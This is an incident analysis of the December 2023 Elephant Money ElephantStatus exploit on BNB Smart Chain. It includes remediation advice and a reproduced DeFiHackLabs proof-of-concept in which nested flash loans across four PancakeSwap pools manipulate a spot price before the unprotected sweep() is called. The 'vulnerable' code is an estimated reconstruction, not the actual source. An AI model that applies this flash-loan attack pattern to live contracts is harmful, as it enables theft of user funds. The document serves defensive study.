# ElephantStatus — Unprotected Public Function + Spot Price Dependency Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-12-06 |
| **Project** | Elephant Money (ElephantStatus) |
| **Chain** | BNB Smart Chain (BSC) |
| **Loss** | ~165,000 USD (BUSD) |
| **Attacker** | [0xbbcc...f1d66d](https://bscscan.com/address/0xbbcc139933d1580e7c40442e09263e90e6f1d66d) |
| **Attack Contract** | [0x69bd...d6bcf](https://bscscan.com/address/0x69bd13f775505989883768ebd23d528c708d6bcf) |
| **Attack Tx** | [0xd423...523439](https://bscscan.com/tx/0xd423ae0e95e9d6c8a89dcfed243573867e4aad29ee99a9055728cbbe0a523439) |
| **Vulnerable Contract** | [0x8Cf0...B5740](https://bscscan.com/address/0x8cf0a553ab3896e4832ebcc519a7a60828ab5740) |
| **Root Cause** | `sweep()` function with no access control + AMM spot price dependency (Flawed Price Dependency) |
| **PoC Source** | [DeFiHackLabs — ElephantStatus_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/ElephantStatus_exp.sol) |

---

## 1. Vulnerability Overview

On December 6, 2023, the `ElephantStatus` contract within the Elephant Money ecosystem deployed on BSC was exploited, resulting in approximately 165,000 USD worth of BUSD being stolen.

The root cause is a combination of two vulnerabilities:

1. **Unprotected Public Function**: The `sweep()` function is declared `external` with no access control whatsoever, allowing anyone to call it arbitrarily.
2. **Manipulable Spot Price Dependency**: The internal logic of `sweep()` performs asset redistribution based on the instantaneous spot price from PancakeSwap AMM, which can be immediately distorted within the same transaction via large-volume swaps.

The attacker obtained a large amount of BUSD through nested flash loans across four PancakeSwap V3 pools, swapped it to WBNB to artificially inflate the WBNB spot price, and then immediately called `sweep()` to trigger asset transfers based on the manipulated price.

This incident represents a second exploitation of a similar vulnerability pattern at the same protocol, following a prior attack in April 2022 that resulted in approximately $11M lost via flash loan + price oracle manipulation.

---

## 2. Vulnerable Code Analysis

### 2.1 Unprotected Public Function sweep() (Core Vulnerability)

```solidity
// ❌ Vulnerable code: no access control + AMM spot price dependency

interface IElephantStatus {
    // ❌ Declared external — no onlyOwner/onlyOperator
    // ❌ Anyone can call arbitrarily
    function sweep() external;
}

// Estimated implementation inside ElephantStatus contract
function sweep() external {
    // ❌ No caller validation — attacker can call freely

    // ❌ AMM getReserves()-based spot price reference (manipulable)
    uint256 wbnbPrice = getWBNBSpotPrice();

    // ❌ Asset redistribution performed based on manipulated wbnbPrice
    // If wbnbPrice is abnormally high, rewardAmount is over-calculated
    uint256 rewardAmount = reserveBalance * wbnbPrice / PRECISION;

    // ❌ Manipulated amount is sent to msg.sender (attacker)
    IERC20(BUSD).transfer(msg.sender, rewardAmount);
}

// ❌ AMM spot price query — immediately manipulable via flash loan
function getWBNBSpotPrice() internal view returns (uint256) {
    // PancakeSwap V2 getReserves() — can be skewed by a single-block swap
    (uint112 reserve0, uint112 reserve1,) =
        IUniswapV2Pair(WBNB_BUSD_PAIR).getReserves();
    return uint256(reserve1) * 1e18 / uint256(reserve0); // BUSD per WBNB
}
```

**Patched safe code**:

```solidity
// ✅ Fixed code: role-based access control + Chainlink price feed

import "@openzeppelin/contracts/access/AccessControl.sol";

// ✅ Access control role definition
bytes32 public constant OPERATOR_ROLE = keccak256("OPERATOR_ROLE");

// ✅ Only authorized addresses can call via onlyRole modifier
function sweep() external onlyRole(OPERATOR_ROLE) {

    // ✅ Chainlink oracle — cannot be manipulated via flash loan
    uint256 wbnbPrice = getWBNBPriceChainlink();

    uint256 rewardAmount = reserveBalance * wbnbPrice / PRECISION;
    IERC20(BUSD).transfer(msg.sender, rewardAmount);
}

// ✅ Uses Chainlink price feed (manipulation-resistant)
function getWBNBPriceChainlink() internal view returns (uint256) {
    AggregatorV3Interface priceFeed = AggregatorV3Interface(
        0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE // BSC: BNB/USD Chainlink feed
    );
    (, int256 price,, uint256 updatedAt,) = priceFeed.latestRoundData();

    // ✅ Data freshness validation — prevent stale price usage
    require(block.timestamp - updatedAt <= 3600, "Price data expired");
    require(price > 0, "Invalid price");

    return uint256(price) * 1e10; // Chainlink 8 decimals → 18 decimals conversion
}
```

**Summary of issues**:
- The `sweep()` function has no access control modifier such as `onlyOwner` or `onlyOperator`, making it callable by anyone
- The internal price calculation relies on PancakeSwap AMM `getReserves()`-based spot price, which can be immediately skewed within the same transaction via a swap
- The combination of both vulnerabilities allows the attacker to perform a one-step attack: manipulate price → call function → realize profit

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Maximum approval of PancakeRouter for BUSD and WBNB (`approve(type(uint256).max)`)
- Designed a nested flash loan structure targeting four PancakeSwap V3 pools:
  - USDC_BUSD (0x22536030B9cE783B6Ddfb9a39ac7F439f568E5e6)
  - BUSDT_BUSD (0x4f3126d5DE26413AbDCF6948943FB9D0847d9818)
  - WBNB_BUSD (0x85FAac652b707FDf6907EF726751087F9E0b6687)
  - BTCB_BUSD (0x369482C78baD380a036cAB827fE677C1903d1523)

### 3.2 Execution Phase

```
┌──────────────────────────────────────────────────────────────────────┐
│                    Attacker EOA                                      │
│          (0xbbcc139933d1580e7c40442e09263e90e6f1d66d)               │
└───────────────────────────┬──────────────────────────────────────────┘
                            │ Deploy attack contract & call testExploit()
                            ▼
┌──────────────────────────────────────────────────────────────────────┐
│               Attack Contract (0x69bd13f...)                        │
│                                                                      │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │ [Step 1] USDC_BUSD V3 Pool                                  │    │
│  │          flash(0, BUSD_total, num=0) → 1st BUSD borrow      │    │
│  └──────────────────────────┬──────────────────────────────────┘    │
│                             │ pancakeV3FlashCallback(num=0)          │
│                             ▼                                        │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │ [Step 2] BUSDT_BUSD V3 Pool                                 │    │
│  │          flash(0, BUSD_total, num=1) → 2nd BUSD borrow      │    │
│  └──────────────────────────┬──────────────────────────────────┘    │
│                             │ pancakeV3FlashCallback(num=1)          │
│                             ▼                                        │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │ [Step 3] WBNB_BUSD V3 Pool                                  │    │
│  │          flash(0, BUSD_total, num=2) → 3rd BUSD borrow      │    │
│  └──────────────────────────┬──────────────────────────────────┘    │
│                             │ pancakeV3FlashCallback(num=2)          │
│                             ▼                                        │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │ [Step 4] BTCB_BUSD V3 Pool                                  │    │
│  │          flash(0, BUSD_total, num=3) → 4th BUSD borrow done │    │
│  └──────────────────────────┬──────────────────────────────────┘    │
│                             │ pancakeV3FlashCallback(num=3) — else   │
│                             ▼                                        │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │ [Step 5] BUSDToWBNB()                                       │    │
│  │          All borrowed BUSD from 4 pools → swap to WBNB      │    │
│  │          Result: WBNB/BUSD AMM spot price artificially spikes│    │
│  └──────────────────────────┬──────────────────────────────────┘    │
│                             │                                        │
│                             ▼                                        │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │ [Step 6] ElephantStatus.sweep()  ◄── Core attack point      │    │
│  │          No access control → attacker can call directly      │    │
│  │          Internally references distorted WBNB spot price     │    │
│  │          → rewardAmount calculated abnormally high           │    │
│  │          → Excessive BUSD transferred to attacker            │    │
│  └──────────────────────────┬──────────────────────────────────┘    │
│                             │                                        │
│                             ▼                                        │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │ [Step 7] WBNBToBUSD()                                       │    │
│  │          All held WBNB → swap back to BUSD (realize profit)  │    │
│  │          swapExactTokensForTokensSupportingFeeOnTransfer     │    │
│  └──────────────────────────┬──────────────────────────────────┘    │
│                             │                                        │
│                             ▼                                        │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │ [Step 8] Repay 4 flash loans                                │    │
│  │          Each callback: BUSD.transfer(msg.sender, amount+fee1)   │
│  │          Sequentially repay principal + fees for all 4 pools │    │
│  └─────────────────────────────────────────────────────────────┘    │
└──────────────────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

- **Attacker profit**: ~165,000 USD (BUSD)
- **Protocol loss**: ~165,000 USD
- **Attack block**: BSC #34,114,760

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~165K USD$
// Attacker: https://bscscan.com/address/0xbbcc139933d1580e7c40442e09263e90e6f1d66d
// Attack Contract: https://bscscan.com/address/0x69bd13f775505989883768ebd23d528c708d6bcf
// Vulnerable Contract: https://bscscan.com/address/0x8cf0a553ab3896e4832ebcc519a7a60828ab5740
// Attack Tx: https://explorer.phalcon.xyz/tx/bsc/0xd423ae0e95e9d6c8a89...

// Vulnerable ElephantStatus contract interface
// ❌ sweep() exposed as external — no access control
interface IElephantStatus {
    function sweep() external;
}

contract ContractTest is Test {
    // PancakeSwap V3 liquidity pools (flash loan sources)
    Uni_Pair_V3 private constant USDC_BUSD  = Uni_Pair_V3(0x22536030...);
    Uni_Pair_V3 private constant BUSDT_BUSD = Uni_Pair_V3(0x4f3126d5...);
    Uni_Pair_V3 private constant WBNB_BUSD  = Uni_Pair_V3(0x85FAac65...);
    Uni_Pair_V3 private constant BTCB_BUSD  = Uni_Pair_V3(0x369482C7...);

    function testExploit() public {
        // [Step 1] Initiate 1st flash loan — borrow all BUSD from USDC_BUSD pool
        USDC_BUSD.flash(
            address(this),
            0,
            BUSD.balanceOf(address(USDC_BUSD)),
            abi.encode(uint8(0), BUSD.balanceOf(address(USDC_BUSD)))
        );
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        uint8 num;
        uint256 amount;
        (num, amount) = abi.decode(data, (uint8, uint256));

        if (num == uint8(0)) {
            // [Step 2] 2nd flash loan — borrow all BUSD from BUSDT_BUSD pool
            BUSDT_BUSD.flash(address(this), 0, BUSD.balanceOf(address(BUSDT_BUSD)),
                abi.encode(uint8(1), BUSD.balanceOf(address(BUSDT_BUSD))));

        } else if (num == uint8(1)) {
            // [Step 3] 3rd flash loan — borrow all BUSD from WBNB_BUSD pool
            WBNB_BUSD.flash(address(this), 0, BUSD.balanceOf(address(WBNB_BUSD)),
                abi.encode(uint8(2), BUSD.balanceOf(address(WBNB_BUSD))));

        } else if (num == uint8(2)) {
            // [Step 4] 4th flash loan — borrow all BUSD from BTCB_BUSD pool
            BTCB_BUSD.flash(address(this), 0, BUSD.balanceOf(address(BTCB_BUSD)),
                abi.encode(uint8(3), BUSD.balanceOf(address(BTCB_BUSD))));

        } else {
            // [Step 5] All 4 pool borrows complete — begin core attack sequence
            BUSD.approve(address(PancakeRouter), type(uint256).max);
            WBNB.approve(address(PancakeRouter), type(uint256).max);

            // [Step 6] Swap large BUSD → WBNB (artificially inflate WBNB spot price)
            BUSDToWBNB();

            // [Step 7] ❌ Core vulnerability: call sweep() with no access control
            // At this point WBNB price is abnormally high
            // sweep() pays attacker excessive BUSD based on distorted price
            Elephant.sweep();

            // [Step 8] Swap WBNB → BUSD to realize profit
            WBNBToBUSD();
        }

        // [Step 9] Repay flash loan principal + fees
        BUSD.transfer(msg.sender, amount + fee1);
    }

    // Swap large BUSD to WBNB — for spot price distortion
    function BUSDToWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSD);
        path[1] = address(WBNB);
        // swapExactTokensForTokens: exact input amount, no minimum output set (slippage=0)
        PancakeRouter.swapExactTokensForTokens(
            BUSD.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    // Swap WBNB back to BUSD — realize profit
    // Uses FeeOnTransfer-supporting version (handles ELEPHANT token fees)
    function WBNBToBUSD() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BUSD);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
```

---

## 5. Vulnerability Classification

| ID   | Vulnerability                          | Severity | CWE     |
|------|---------------------------------|----------|---------|
| V-01 | Unprotected Public Function (sweep)    | CRITICAL | CWE-284 |
| V-02 | Spot Price Dependency (Flawed Price Dependency) | CRITICAL | CWE-682 |
| V-03 | Flash Loan-Based Price Manipulation    | HIGH     | CWE-840 |

### V-01: Unprotected Public Function (Unprotected sweep())
- **Description**: The `sweep()` function is declared `external` but contains absolutely no caller validation logic (`onlyOwner`, `onlyOperator`, etc.). Anyone, including attackers, can call this function arbitrarily.
- **Impact**: An external attacker can freely call `sweep()` at a chosen moment (immediately after price manipulation) to trigger the internal price calculation logic. The function executes under a manipulated market state, causing protocol assets to be abnormally transferred to the attacker.
- **Attack Precondition**: None. Callable from anywhere on the public network.

### V-02: Spot Price Dependency (Flawed Price Dependency)
- **Description**: The internal logic of `sweep()` uses the instantaneous spot price derived from PancakeSwap AMM's `getReserves()` as the basis for WBNB value calculation. AMM spot prices can be immediately distorted within the same transaction via large-volume swaps.
- **Impact**: If the attacker purchases WBNB using a large flash-loaned BUSD to artificially inflate the spot price and then calls `sweep()`, the contract over-calculates the value of WBNB and pays out excessive BUSD to the attacker.
- **Attack Precondition**: Sufficient flash loan funds + existence of a WBNB/BUSD liquidity pool + no restrictions on `sweep()` calls (V-01)

### V-03: Flash Loan-Based Price Manipulation
- **Description**: Uses a nested flash loan callback pattern across four PancakeSwap V3 pools (USDC_BUSD, BUSDT_BUSD, WBNB_BUSD, BTCB_BUSD) to temporarily accumulate a massive amount of BUSD, then swaps it all to WBNB to abruptly skew the AMM spot price.
- **Impact**: Enables the actual attack in conjunction with V-02. Combined with V-01+V-02, allows large-scale theft within a single transaction.
- **Attack Precondition**: Publicly accessible V3 flash loan pools exist. Borrowing is possible without any upfront capital.

---

## 6. Remediation Recommendations

### Immediate Actions

**Add access control to the sweep() function**:

```solidity
// ✅ Role-based access control using OpenZeppelin AccessControl
import "@openzeppelin/contracts/access/AccessControl.sol";

contract ElephantStatus is AccessControl {
    bytes32 public constant OPERATOR_ROLE = keccak256("OPERATOR_ROLE");

    constructor(address admin) {
        _grantRole(DEFAULT_ADMIN_ROLE, admin);
    }

    // ✅ onlyRole(OPERATOR_ROLE) — only authorized addresses can call
    function sweep() external onlyRole(OPERATOR_ROLE) {
        uint256 wbnbPrice = getWBNBPriceChainlink(); // ✅ Use Chainlink
        uint256 rewardAmount = reserveBalance * wbnbPrice / PRECISION;
        IERC20(BUSD).transfer(msg.sender, rewardAmount);
    }
}
```

**Replace price oracle with Chainlink**:

```solidity
// ✅ Chainlink price feed — cannot be manipulated via flash loan
function getWBNBPriceChainlink() internal view returns (uint256) {
    AggregatorV3Interface priceFeed = AggregatorV3Interface(
        0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE // BSC: BNB/USD
    );
    (, int256 price,, uint256 updatedAt,) = priceFeed.latestRoundData();

    // ✅ Staleness prevention — only trust data updated within 1 hour
    require(block.timestamp - updatedAt <= 3600, "Chainlink: stale price");
    require(price > 0, "Chainlink: invalid price");

    return uint256(price) * 1e10; // 8 decimals → 18 decimals
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Unprotected Public Function (V-01) | Introduce OpenZeppelin AccessControl, grant OPERATOR_ROLE |
| AMM Spot Price Dependency (V-02) | Replace with Chainlink price feed + staleness validation |
| Single Oracle Source | Multi-oracle weighted average + anomaly detection Circuit Breaker |
| Flash Loan Vulnerability (V-03) | Set price deviation threshold (revert if change exceeds X% within single block) |
| Emergency Response | Introduce pausable pattern — immediately pause protocol upon anomaly detection |

---

## 7. Lessons Learned

1. **Functions that modify assets must have access control**: Every function that moves tokens — asset redistribution, reward payouts, liquidations — requires an access control modifier such as `onlyOwner` or `onlyRole`. Even if it appears to be an "internal function," once declared `external`/`public`, anyone can call it.

2. **AMM spot prices must not be used as oracles**: The spot price derived from PancakeSwap/Uniswap's `getReserves()` can be manipulated instantaneously within the same transaction. Use Chainlink price feeds or TWAP with a sufficient observation window (30 minutes or more).

3. **Nested flash loans are a standard attack vector**: They allow temporarily accumulating far larger amounts than a single flash loan. Nesting across four pools can reach hundreds of millions of dollars. Circuit Breakers (price spike detection) must be implemented against large single-block capital inflows.

4. **Similar vulnerabilities are repeatedly exploited within the same protocol**: Elephant Money was attacked twice with similar price dependency vulnerabilities — in April 2022 (~$11M) and again in December 2023 (~$165K). After patching the first incident, residual vulnerabilities of the same pattern must be thoroughly eliminated, and a comprehensive audit of the entire codebase is required.

5. **Interface exposure alone reveals vulnerabilities**: The attack PoC confirmed the vulnerability with just a single line: `interface IElephantStatus { function sweep() external; }`. When designing a contract's public interface, the access permissions of each function must be clearly documented and reviewed.

---

## 8. On-Chain Verification

On-chain verification tool (`cast`) not executed — network environment not configured.

The following items are written based on PoC code analysis and public references (Phalcon analysis).

### 8.1 PoC vs. Reference Data Comparison

| Field | PoC / Reference Value | Notes |
|------|-------------|------|
| Total Loss | ~165,000 USD | Confirmed in PoC `@KeyInfo` comment |
| Attack Block | BSC #34,114,760 | `vm.createSelectFork("bsc", 34_114_760)` |
| Attacker Address | 0xbbcc...f1d66d | Confirmed in `@KeyInfo` comment |
| Vulnerable Contract | 0x8Cf0...B5740 | Confirmed in `@KeyInfo` comment |
| Flash Loan Pool Count | 4 (V3) | USDC_BUSD, BUSDT_BUSD, WBNB_BUSD, BTCB_BUSD |
| Core Function Called | `sweep()` | Confirmed directly in PoC else branch |

### 8.2 On-Chain Event Log Sequence (Estimated)

| Order | Event | Description |
|------|--------|------|
| 1 | Flash (USDC_BUSD) | 1st BUSD borrow |
| 2 | Flash (BUSDT_BUSD) | 2nd BUSD borrow |
| 3 | Flash (WBNB_BUSD) | 3rd BUSD borrow |
| 4 | Flash (BTCB_BUSD) | 4th BUSD borrow |
| 5 | Swap (BUSD→WBNB) | Artificially inflate WBNB spot price |
| 6 | Transfer (BUSD, ElephantStatus→Attacker) | sweep() executes — transfer based on manipulated price |
| 7 | Swap (WBNB→BUSD) | Reverse swap to realize profit |
| 8-11 | Transfer × 4 (fee repayment) | Repay flash loans for all 4 pools |

### 8.3 Precondition Verification

| Condition | Status |
|------|------|
| BUSD approve(PancakeRouter) | Performed in else branch within attack transaction |
| WBNB approve(PancakeRouter) | Performed in else branch within attack transaction |
| sweep() call permission | Unrestricted — no precondition required |
| Flash loan collateral | Not required — repaid within the same transaction |